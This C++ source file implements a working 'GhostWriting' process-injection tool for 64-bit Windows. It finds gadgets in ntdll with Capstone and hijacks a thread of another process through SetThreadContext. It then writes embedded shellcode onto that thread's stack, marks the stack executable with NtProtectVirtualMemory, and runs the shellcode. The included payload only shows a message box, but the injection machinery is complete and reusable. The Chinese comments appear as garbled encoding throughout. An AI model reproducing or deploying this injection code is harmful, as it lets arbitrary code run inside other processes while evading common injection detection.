#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "include/capstone/capstone.h"

#pragma comment(lib, "capstone.lib")


INT Start = 0x0; // Shellcode���ƫ��
BYTE Shellcode[] = {
	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
	0x00,0x00,0x00,0x41,0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x48,0x60,0x48,0x8b,0x41,
	0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xd0,0x48,0x8b,0x12,0x48,0x8b,0x4a,0x40,0x0f,
	0xb7,0x41,0x28,0x66,0x83,0xe8,0x4b,0x66,0x41,0x85,0xc1,0x75,0x54,0x0f,0xb7,0x41,
	0x2a,0x66,0x83,0xe8,0x45,0x66,0x41,0x85,0xc1,0x75,0x46,0x0f,0xb7,0x41,0x2c,0x66,
	0x83,0xe8,0x52,0x66,0x41,0x85,0xc1,0x75,0x38,0x0f,0xb7,0x41,0x2e,0x66,0x83,0xe8,
	0x4e,0x66,0x41,0x85,0xc1,0x75,0x2a,0x0f,0xb7,0x41,0x30,0x66,0x83,0xe8,0x45,0x66,
	0x41,0x85,0xc1,0x75,0x1c,0x0f,0xb7,0x41,0x32,0x66,0x83,0xe8,0x4c,0x66,0x41,0x85,
	0xc1,0x75,0x0e,0x66,0x83,0x79,0x34,0x33,0x75,0x07,0x66,0x83,0x79,0x36,0x32,0x74,
	0x63,0x49,0x3b,0xd0,0x75,0x92,0x33,0xdb,0xba,0x5a,0xc1,0xcb,0xc2,0x48,0x8b,0xcb,
	0xe8,0x5b,0x00,0x00,0x00,0xba,0x53,0xc0,0x49,0x9c,0x48,0x8b,0xcb,0x48,0x8b,0xf8,
	0xe8,0x4b,0x00,0x00,0x00,0x48,0x8d,0x0d,0x14,0x01,0x00,0x00,0xff,0xd0,0x48,0x85,
	0xc0,0x74,0x26,0x48,0x8d,0x15,0x16,0x01,0x00,0x00,0x48,0x8b,0xc8,0xff,0xd7,0x48,
	0x85,0xc0,0x74,0x15,0x45,0x33,0xc9,0x4c,0x8d,0x05,0x12,0x01,0x00,0x00,0x48,0x8d,
	0x15,0x13,0x01,0x00,0x00,0x33,0xc9,0xff,0xd0,0x48,0x8b,0x5c,0x24,0x30,0x48,0x83,
	0xc4,0x20,0x5f,0xc3,0x48,0x8b,0x5a,0x20,0xeb,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,0x41,0x3c,0x4c,0x8b,
	0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,0x03,0xd1,0x45,0x8b,
	0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,0x33,0xc9,0x41,0x3b,
	0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,0xdb,0xeb,0x0d,0x45,
	0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,0x8a,0x02,0x84,0xc0,
	0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,0x04,0x41,0x3b,0x4a,
	0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,0x8b,0x4a,0x24,0x49,
	0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,0xeb,0x02,0x33,0xc0,
	0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x34,0x06,0x00,0x0a,0x32,0x06,0x70,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xfa,0x00,0x00,0x00,0x90,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x74,0x02,0x00,0x05,0x64,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x01,0x00,0x00,0x8b,0x01,0x00,0x00,0xb0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x41,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x48,0x65,0x6c,0x6c,0x6f,0x00
};

struct GW {
	enum REG { Rbx, Rsi, Rdi };

	REG DREG; // Ŀ�ļĴ���
	REG SREG; // Դ�Ĵ���

	PVOID JMPTOSELFAddress;
	PVOID MOVRETAddress;

	INT Displacement; // λ����
	INT PopCount; // POP����
	INT RspCompensation; // RSP����
};

BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	for (unsigned int i = 0; i < NTDLLCodeSize; i++) {
		if ((NTDLLCode[i] == 0xEB) && (NTDLLCode[i + 1] == 0xFE)) {
			Ghost->JMPTOSELFAddress = NTDLLCode + i;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	csh Handle;
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &Handle)) {
		_tprintf(_T("[x] Failed to initialize engine\n"));
		return FALSE;
	}

	// ����ϸ��ѡ��
	cs_option(Handle, CS_OPT_DETAIL, CS_OPT_ON);

	const int MAX_OPCODE_SIZE = 16; // OPָ�����󳤶�
	const int MAX_OPCODE_COUNT = 5; // һ���Է���������

	for (unsigned int i = 0; i < NTDLLCodeSize - MAX_OPCODE_SIZE * MAX_OPCODE_COUNT; i++) {

		// һ���Է���� MAX_OPCODE_COUNT ��ָ��
		cs_insn* Insn;
		SIZE_T Count = cs_disasm(Handle, NTDLLCode + i, MAX_OPCODE_SIZE * MAX_OPCODE_COUNT, 0, MAX_OPCODE_COUNT, &Insn);
		if (Count == 0)
			continue;

		// ��ʼ��
		Ghost->MOVRETAddress = 0;
		Ghost->Displacement = 0;
		Ghost->PopCount = 0;
		Ghost->RspCompensation = 0;

		// ��ʼ���ָ��
		for (unsigned int j = 0; j < Count; j++) {

			// ��һ�����Ϊ mov [reg1], reg2
			if (j == 0) {

				if (strcmp(Insn->mnemonic, "mov") != 0)
					break;

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);

				// Ҫ���������Ϊ�ڴ棬�Ҳ�����Ϊ�Ĵ���
				if (opl->type != X86_OP_MEM || opr->type != X86_OP_REG) 
					break;

				// ����Ҳ����Ƿ�Ϊ���������Ĵ���
				if (opr->reg != X86_REG_RBX &&
					opr->reg != X86_REG_RSI &&
					opr->reg != X86_REG_RDI)
					break;
				

				// �����������Ƿ�Ϊ���������Ĵ���
				if (opl->mem.base != X86_REG_RBX &&
					opl->mem.base != X86_REG_RSI &&
					opl->mem.base != X86_REG_RDI)
					break;

				// ��������Ƿ�����Ҳ�����
				if (opl->mem.base == opr->reg)
					break;

				// ����Դ�Ĵ���
				switch (opr->reg)
				{
				case X86_REG_RBX:
					Ghost->SREG = GW::Rbx;
					break;
				case X86_REG_RSI:
					Ghost->SREG = GW::Rsi;
					break;
				case X86_REG_RDI:
					Ghost->SREG = GW::Rdi;
					break;
				}

				// ����Ŀ��Ĵ���
				switch (opl->mem.base)
				{
				case X86_REG_RBX:
					Ghost->DREG = GW::Rbx;
					break;
				case X86_REG_RSI:
					Ghost->DREG = GW::Rsi;
					break;
				case X86_REG_RDI:
					Ghost->DREG = GW::Rdi;
					break;
				}

				// �������������λ����
				Ghost->Displacement = (INT)opl->mem.disp;
			}

			// Ѱ�� ret ָ��
			else if (strcmp(Insn[j].mnemonic, "ret") == 0) {

				Ghost->MOVRETAddress = NTDLLCode + i;

				printf("[+] Found MOV RET Opcode:\n");
				for (unsigned int k = 0; k <= j; k++)
					_tprintf(_T("[+] 0x%p:\t%hs\t\t%hs\n"), NTDLLCode + i, Insn[k].mnemonic, Insn[k].op_str);

				// �ҵ����������� MOVRETAddress ��ֱ�ӷ���
				cs_free(Insn, Count);
				cs_close(&Handle);
				return TRUE;
			}

			// ���� mov reg, ?? ָ��
			else if (strcmp(Insn[j].mnemonic, "mov") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);

				// Ҫ���������Ϊ�Ĵ���
				if (opl->type != X86_OP_REG) {
					break;
				}
			}

			// ���� add rsp, ?? ָ��
			else if (strcmp(Insn[j].mnemonic, "add") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);
				cs_x86_op* opr = &(Insn[j].detail->x86.operands[1]);

				// Ҫ���������Ϊ�Ĵ������Ҳ�����Ϊ������
				if (opl->type != X86_OP_REG || opr->type != X86_OP_IMM)
					break;

				// ������������rsp���򱣴�������
				if (opl->reg == X86_REG_RSP)
					Ghost->RspCompensation = (INT)opr->imm;
			}

			// ���� xor reg, ?? ָ��
			else if (strcmp(Insn[j].mnemonic, "xor") == 0) {

				cs_x86_op* opl = &(Insn[j].detail->x86.operands[0]);

				// Ҫ���������Ϊ�Ĵ���
				if (opl->type != X86_OP_REG)
					break;
			}

			// ���� pop reg ָ��
			else if (strcmp(Insn[j].mnemonic, "pop") == 0) {
				Ghost->PopCount += 1;
			}

			// ����������ָ��
			else {
				break;
			}
		}

		cs_free(Insn, Count);
	}

	cs_close(&Handle);

	return FALSE;
}

BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOSELFAddress)
{
	SetThreadContext(Thread, ThreadContext);

	_tprintf(_T("\n"));
	_tprintf(_T("[D] After inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext->Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext->Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext->Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext->Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext->Rip);

	// �����߳�
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);

	do {
		ResumeThread(Thread);
		Sleep(3);
		SuspendThread(Thread);

		if (GetThreadContext(Thread, ThreadContext) == 0) {
			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
			return FALSE;
		}
		
	} while ((PVOID)ThreadContext->Rip != JMPTOSELFAddress);

	return TRUE;
}

BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
{
	// ��ȡ��ǰ�߳�������
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	// ����Դ�Ĵ���
	DWORD64* SREG;

	switch (Ghost->SREG)
	{
	case GW::Rbx:
		SREG = &ThreadContext.Rbx;
		break;
	case GW::Rsi:
		SREG = &ThreadContext.Rsi;
		break;
	case GW::Rdi:
		SREG = &ThreadContext.Rdi;
		break;
	default:
		SREG = NULL;
		break;
	}

	if (SREG == NULL) {
		_tprintf(_T("[x] Unsupported source register: %d\n"), Ghost->SREG);
		return FALSE;
	}

	// ����Ŀ�ļĴ���
	DWORD64* DREG;

	switch (Ghost->DREG)
	{
	case GW::Rbx:
		DREG = &ThreadContext.Rbx;
		break;
	case GW::Rsi:
		DREG = &ThreadContext.Rsi;
		break;
	case GW::Rdi:
		DREG = &ThreadContext.Rdi;
		break;
	default:
		DREG = NULL;
		break;
	}

	if (DREG == NULL) {
		_tprintf(_T("[x] Unsupported destination register: %d\n"), Ghost->DREG);
		return FALSE;
	}

	//
	// ����RSPԤ���ռ�
	//

	// Ԥ��Shellcode�ռ�
	INT BytesOfShellcode = sizeof(Shellcode);
	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID); // ȡ sizeof(PVOID) ��������ֵ

	// Ԥ��NtProtectVirtualMemory�����ռ�
	INT BytesOfNtProtectVirtualMemoryCallFrame = (1 + 5 + 3) * sizeof(PVOID);

	// Ԥ��JMPTOSELFAddress��ַ�ռ�
	INT BytesOfJmpToSelfAddress = sizeof(PVOID);

	// ����RSPջ��λ��
	DWORD64 StackTopAddress = ThreadContext.Rsp
		- BytesOfShellcode
		- BytesOfNtProtectVirtualMemoryCallFrame
		- BytesOfJmpToSelfAddress
		- Ghost->RspCompensation				// ����RSP
		- (Ghost->PopCount * sizeof(PVOID));	// ����POP

	// ջ����
	StackTopAddress = StackTopAddress - (StackTopAddress % 16) - 16;

	//
	// RSP����д��JMPTOSELFAddress��ַ
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// Դ�Ĵ������潫Ҫд�������
	*SREG = (DWORD64)Ghost->JMPTOSELFAddress;

	// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
	*DREG = ThreadContext.Rsp
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
		- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

	// RIPָ��MOVRETAddress
	ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// д��NtProtectVirtualMemory����
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// ���Ǹ�fastcall����Լ���ĺ���������˳�� RCX RDX R8 R9��OldAccessProtection����ʹ��ѹջ����
	// 
	//NTSTATUS NtProtectVirtualMemory(
	//	HANDLE ProcessHandle,
	//	PVOID *BaseAddress,
	//	SIZE_T *NumberOfBytesToProtect,
	//	ULONG NewAccessProtection,
	//	PULONG OldAccessProtection)

	DWORD64 NtProtectVirtualMemoryCallFrame[1 + 5 + 3] = { // ���� 1+5+3 ����иĶ���ǰ���BytesOfNtProtectVirtualMemoryCallFrame�����˸ĵ�

		(DWORD64)Ghost->JMPTOSELFAddress,	// ջ֡�����ص�ַ
		
		(DWORD64)-1,						// ջ֡������ ProcessHandle

		ThreadContext.Rsp					// ջ֡������ *BaseAddress��ע������һ������ָ�룬ָ����ʱָ�� BaseAddress
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 0) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		ThreadContext.Rsp					// ջ֡������ NumberOfBytesToProtect��ע������һ��ָ�룬ָ����ʱ���� NumberOfBytesToProtect
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 1) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		PAGE_EXECUTE_READWRITE,				// ջ֡������ NewAccessProtection

		ThreadContext.Rsp					// ջ֡������ OldAccessProtection��ע������һ��ָ�룬ָ����ʱ���� OldAccessProtection
			+ BytesOfJmpToSelfAddress
			+ ((1 + 5 + 2) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),

		ThreadContext.Rsp					// ��ʱָ�� BaseAddress��ָ��Shellcode����
			+ BytesOfJmpToSelfAddress
			+ BytesOfNtProtectVirtualMemoryCallFrame
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		(DWORD64)BytesOfShellcode,			// ��ʱ���� NumberOfBytesToProtect���ڴ汣���Ĵ�С
		
		0									// ��ʱ���� OldAccessProtection������ԭ�ڴ�Ȩ��
	};

	for (int i = 0; i < sizeof(NtProtectVirtualMemoryCallFrame) / sizeof(NtProtectVirtualMemoryCallFrame[0]); i++) {

		// ����RSP
		ThreadContext.Rsp = StackTopAddress;

		// Դ�Ĵ������潫Ҫд�������
		*SREG = NtProtectVirtualMemoryCallFrame[i];

		// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
		*DREG = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
			+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
			- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

		// RIPָ��MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// д������
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// д��Shellcode
	//

	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {

		// ����RSP
		ThreadContext.Rsp = StackTopAddress;

		// Դ�Ĵ������潫Ҫд�������
		*SREG = ((DWORD64*)Shellcode)[i];

		// Ŀ�ļĴ������潫Ҫд��ĵ�ַ
		*DREG = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ BytesOfNtProtectVirtualMemoryCallFrame
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
			+ (Ghost->PopCount * sizeof(PVOID))		// ƽ��POP�Ĳ���
			- Ghost->Displacement;					// ����MOVָ���е�λ�Ƶ�ַ

		// RIPָ��MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// д������
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// ִ��NtProtectVirtualMemory
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// ջ֡������ ProcessHandle
	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[1];

	// ջ֡������ *BaseAddress��ע������һ������ָ�룬ָ����ʱָ�� BaseAddress
	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[2];

	// ջ֡������ NumberOfBytesToProtect��ע������һ��ָ�룬ָ����ʱ���� NumberOfBytesToProtect
	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[3];

	// ջ֡������ NewAccessProtection
	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[4];

	// RSPָ��NtProtectVirtualMemoryCallFrame
	ThreadContext.Rsp = ThreadContext.Rsp
		+ BytesOfJmpToSelfAddress
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// RIPָ��NtProtectVirtualMemory
	ThreadContext.Rip = (DWORD64)NtProtectVirtualMemory;

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// ִ��Shellcode
	//

	// ����RSP
	ThreadContext.Rsp = StackTopAddress;

	// RIPָ��Shellcode
	ThreadContext.Rip = ThreadContext.Rsp
		+ BytesOfNtProtectVirtualMemoryCallFrame
		+ BytesOfJmpToSelfAddress
		+ Start									// Shellcode���ƫ��
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// RSPָ��JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// ƽ��RSP�Ĳ���
		+ (Ghost->PopCount * sizeof(PVOID));	// ƽ��POP�Ĳ���

	// д������
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	return TRUE; // Լ����ע����ɺ��̱߳��봦����ͣ״̬
}

int _tmain(int argc, TCHAR* argv[])
{
	// ��ȡntdllģ��
	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
	if (NTDLLBase == NULL) {
		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
		return 0;
	}

	// ��ȡntdll��.text�ε�ַ���Լ�.text�δ�С
	PUCHAR NTDLLCode = (PUCHAR)((UINT_PTR)NTDLLBase + 0x1000);
	PIMAGE_NT_HEADERS NTDLLPEHeader = (PIMAGE_NT_HEADERS)((UINT_PTR)NTDLLBase + ((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);
	DWORD NTDLLCodeSize = NTDLLPEHeader->OptionalHeader.SizeOfCode;

	// ��ȡNtProtectVirtualMemory�ĺ�����ַ
	PVOID NtProtectVirtualMemory = (PVOID)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");
	if (NtProtectVirtualMemory == NULL) {
		_tprintf(_T("[x] Can't get NtProtectVirtualMemory address\n"));
		return 0;
	}

	// ��д�ṹ��
	GW Ghost;

	// ��ȡ����ת��ַ
	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] JMPTOSELFAddress = %p\n"), Ghost.JMPTOSELFAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find JMPTOSELFAddress\n"));
		return 0;
	}

	// ��ȡת�Ʒ��ص�ַ
	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] MOVRETAddress = %p\n"), Ghost.MOVRETAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find MOVRETAddress\n"));
		return 0;
	}

	// ���߳�
	// HWND Window = FindWindow(NULL, _T("HashCalc"));
	HWND Window = FindWindow(_T("CalcFrame"), NULL);
	// HWND Window = GetShellWindow();
	if (Window == NULL) {
		_tprintf(_T("[x] Can't find target window\n"));
		return 0;
	}

	DWORD ThreadId = GetWindowThreadProcessId(Window, NULL);
	_tprintf(_T("[D] ThreadId = %d\n"), ThreadId);

	HANDLE Thread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadId);
	if (Thread == NULL) {
		_tprintf(_T("[x] Can't open target thread\n"));
		return 0;
	}

	// ��ͣ�߳�
	SuspendThread(Thread);

	// �����߳������ģ����ڻ�ԭ
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	_tprintf(_T("\n"));
	_tprintf(_T("[D] Before inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext.Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext.Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext.Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext.Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext.Rip);

	// ��ʼע�룬Լ����ע����ɺ��̱߳��봦����ͣ״̬
	if (Inject(Thread, Window, &Ghost, NtProtectVirtualMemory) == TRUE) {
		_tprintf(_T("[+] Inject success\n"));
	}
	else {
		_tprintf(_T("[-] Inject failed\n"));
	}

	// ��ԭ�߳�
	SetThreadContext(Thread, &ThreadContext);
	ResumeThread(Thread);

	// �����߳�
	PostMessage(Window, WM_USER, 0, 0);

	CloseHandle(Thread);
	return 0;
}
